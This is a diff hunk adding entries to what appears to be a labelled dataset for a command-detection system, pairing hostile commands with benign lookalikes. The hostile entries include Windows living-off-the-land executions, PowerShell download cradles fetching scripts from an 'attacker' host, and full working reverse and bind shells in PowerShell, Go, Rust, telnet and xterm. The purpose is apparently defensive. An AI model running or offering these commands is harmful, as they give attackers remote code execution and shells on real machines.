@@ -147,6 +147,132 @@
    "_class": "shell_spawn",
    "intent": "vim/view/ex driven non-interactively to spawn a shell or run code: `vim -c ':!/bin/sh'`, `vim -c ':py import os; os.syst",
    "benign": "vim -c ':wq' notes.txt or `vim -es -c ':%s/old/new/g' -c ':wq' file` — scripted edit/substitute-and-save; -c present but"
+  },
+  {
+   "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://attacker/a.sct\")",
+   "target_signal": "exec.windows_lolbin",
+   "_class": "windows_lolbin",
+   "intent": "rundll32 invoked with a `javascript:` / `vbscript:` URI moniker or `,RunHTMLApplication` / `GetObject(\"script:...\")` — u",
+   "benign": "rundll32.exe shell32.dll,Control_RunDLL desk.cpl or rundll32 printui.dll,PrintUIEntry — invoking a real exported entry p"
+  },
+  {
+   "command": "rundll32.exe url.dll,OpenURL \"C:\\payload.hta\"",
+   "target_signal": "exec.windows_lolbin",
+   "_class": "windows_lolbin",
+   "intent": "rundll32 calling url.dll/ieframe.dll exports (OpenURL / FileProtocolHandler / OpenURLA) or shell32.dll,ShellExec_RunDLL ",
+   "benign": "rundll32 shell32.dll,Control_RunDLL or an installer calling a vendor DLL export to register a component — uses a real fu"
+  },
+  {
+   "command": "msbuild.exe C:\\users\\public\\payload.xml",
+   "target_signal": "exec.windows_lolbin",
+   "_class": "windows_lolbin",
+   "intent": "msbuild handed a .xml/.csproj/.proj that contains an inline `<Task>`/`CodeTaskFactory`/`Microsoft.Build.Tasks.CodeTaskFa",
+   "benign": "msbuild MyApp.sln or msbuild MyApp.csproj /p:Configuration=Release run from a real source tree by a dev/CI — a normal pr"
+  },
+  {
+   "command": "InstallUtil.exe /logfile= /LogToConsole=false /U C:\\temp\\payload.dll",
+   "target_signal": "exec.windows_lolbin",
+   "_class": "windows_lolbin",
+   "intent": "InstallUtil run with `/logfile= /LogToConsole=false /U <dll/exe>` — the /U (uninstall) path executes the assembly's atta",
+   "benign": "installutil MyWindowsService.exe — a developer/admin registering a real .NET service installer (Install, not /U-with-sup"
+  },
+  {
+   "command": "wmic.exe process call create \"powershell -nop -w hidden -c IEX(...)\"",
+   "target_signal": "exec.windows_lolbin",
+   "_class": "windows_lolbin",
+   "intent": "wmic `process call create \"<cmd>\"` spawns an arbitrary process via the WMI provider (bypasses some process-creation moni",
+   "benign": "wmic process list brief / wmic logicaldisk get size,freespace / wmic os get caption — read-only inventory queries used b"
+  },
+  {
+   "command": "powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker/a.ps1')\"",
+   "target_signal": "exec.windows_lolbin",
+   "_class": "windows_lolbin",
+   "intent": "PowerShell download-cradle: `IEX`/`Invoke-Expression` fed a `(New-Object Net.WebClient).DownloadString(...)` / `Invoke-W",
+   "benign": "powershell -File C:\\scripts\\backup.ps1 or Invoke-WebRequest -OutFile pkg.zip https://repo/... — running a saved script o"
+  },
+  {
+   "command": "conhost.exe --headless powershell -nop -c IEX(...)",
+   "target_signal": "exec.windows_lolbin",
+   "_class": "windows_lolbin",
+   "intent": "conhost used as an execution proxy — `conhost.exe <command>` (esp. `--headless`) launches the target with conhost as the",
+   "benign": "There is essentially no benign command-line invocation of conhost with arguments — the OS auto-launches conhost.exe as t"
+  },
+  {
+   "command": "msiexec /q /i http://attacker/payload.msi",
+   "target_signal": "exec.windows_lolbin",
+   "_class": "windows_lolbin",
+   "intent": "msiexec installing a REMOTE/renamed .msi silently (`/q` or `/qb`/`/quiet` + `/i http(s)://...`) or registering a DLL via",
+   "benign": "msiexec /i C:\\Installers\\VendorApp.msi or msiexec /x {GUID} /qn — installing/uninstalling a real local vendor package or"
+  },
+  {
+   "command": "cmstp.exe /ni /s C:\\users\\public\\payload.inf",
+   "target_signal": "exec.windows_lolbin",
+   "_class": "windows_lolbin",
+   "intent": "cmstp with `/ni /s <inf>` silently installs a Connection-Manager .INF whose UnRegisterOCXSection runs a .SCT via scrobj.",
+   "benign": "An admin/VPN client deploying a legitimate Connection Manager profile, e.g. cmstp.exe \"CorpVPN.inf\" launched interactive"
+  },
+  {
+   "command": "ScriptRunner.exe -appvscript \\\\attacker\\share\\payload.cmd",
+   "target_signal": "exec.windows_lolbin",
+   "_class": "windows_lolbin",
+   "intent": "ScriptRunner.exe `-appvscript <exe|cmd>` executes an arbitrary executable/cmd (incl. a remote SMB/UNC path) as a child o",
+   "benign": "On a genuine App-V (Application Virtualization) host, ScriptRunner is invoked by the App-V client itself to run a packag"
+  },
+  {
+   "command": "pcalua.exe -a C:\\users\\public\\payload.exe",
+   "target_signal": "exec.windows_lolbin",
+   "_class": "windows_lolbin",
+   "intent": "pcalua (Program Compatibility Assistant) used as a launcher: `-a <exe|dll|cpl>` runs an arbitrary binary as a child of p",
+   "benign": "Windows itself launches pcalua.exe automatically when the Program Compatibility Assistant offers to re-run an old instal"
+  },
+  {
+   "command": "wuauclt.exe /UpdateDeploymentProvider C:\\temp\\payload.dll /RunHandlerComServer",
+   "target_signal": "exec.windows_lolbin",
+   "_class": "windows_lolbin",
+   "intent": "wuauclt (Windows Update client) abused for DLL proxy execution: `/UpdateDeploymentProvider <dll> /RunHandlerComServer` l",
+   "benign": "wuauclt /detectnow or wuauclt /reportnow — admins/scripts triggering a Windows Update scan/report cycle; these classic s"
+  },
+  {
+   "command": "telnet 10.0.0.1 8080 | /bin/sh | telnet 10.0.0.1 8081",
+   "target_signal": "c2.reverse_shell",
+   "_class": "reverse_shell",
+   "intent": "Double-telnet reverse shell: two telnet connections to attacker (one for stdin, one for stdout) joined by a shell in the",
+   "benign": "telnet smtp.example.com 25 (manual SMTP probe), telnet 192.168.1.1 (router login), telnet localhost 6379 (poke a Redis p"
+  },
+  {
+   "command": "xterm -display 10.0.0.1:1",
+   "target_signal": "c2.reverse_shell",
+   "_class": "reverse_shell",
+   "intent": "X11 reverse shell: `xterm -display ATTACKER_IP:N` forces xterm to render against the attacker's X server (listening on T",
+   "benign": "xterm (local terminal), xterm -bg black -fg white, xterm -e 'vim file' (run a command locally), or DISPLAY=:0 inside a d"
+  },
+  {
+   "command": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendbyte=([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
+   "target_signal": "c2.reverse_shell",
+   "_class": "reverse_shell",
+   "intent": "The canonical Nishang/PowerShell TCPClient reverse shell: `New-Object System.Net.Sockets.TCPClient(host,port)` + `GetStr",
+   "benign": "New-Object System.Net.WebClient (download), New-Object PSObject, New-Object System.Net.Sockets.TcpListener (a server, di"
+  },
+  {
+   "command": "powercat -l -p 7002 -ep",
+   "target_signal": "c2.reverse_shell",
+   "_class": "reverse_shell",
+   "intent": "PowerShell bind shell: either powercat in listen+execute-process mode `powercat -l -p PORT -ep` (the `-ep` binds a cmd/p",
+   "benign": "powercat -c 127.0.0.1 -p 7002 (client connect mode, no -ep), or New-Object System.Net.Sockets.TCPClient (outbound client"
+  },
+  {
+   "command": "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"10.0.0.1:4242\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
+   "target_signal": "c2.reverse_shell",
+   "_class": "reverse_shell",
+   "intent": "Go reverse shell: `net.Dial(\"tcp\", host:port)` to the attacker, then `exec.Command(\"/bin/sh\")` with the connection wired",
+   "benign": "net.Dial(\"tcp\", \"db:5432\") (open a DB connection), exec.Command(\"git\",\"status\") (run a tool), client, _ := net.Dial(\"tcp"
+  },
+  {
+   "command": "let s = TcpStream::connect(\"10.0.0.1:4242\").unwrap(); let fd = s.as_raw_fd(); Command::new(\"/bin/sh\").arg(\"-i\").stdin(unsafe { Stdio::from_raw_fd(fd) }).stdout(unsafe { Stdio::from_raw_fd(fd) }).stderr(unsafe { Stdio::from_raw_fd(fd) }).spawn().unwrap().wait().unwrap();",
+   "target_signal": "c2.reverse_shell",
+   "_class": "reverse_shell",
+   "intent": "Rust reverse shell: `TcpStream::connect(host:port)` then the raw socket fd is handed to `Command::new(\"/bin/sh\")` via `S",
+   "benign": "TcpStream::connect(\"db:5432\")? (normal client), let stream = TcpStream::connect(addr).await? (async network code). A Tcp"
   }
  ]
 }
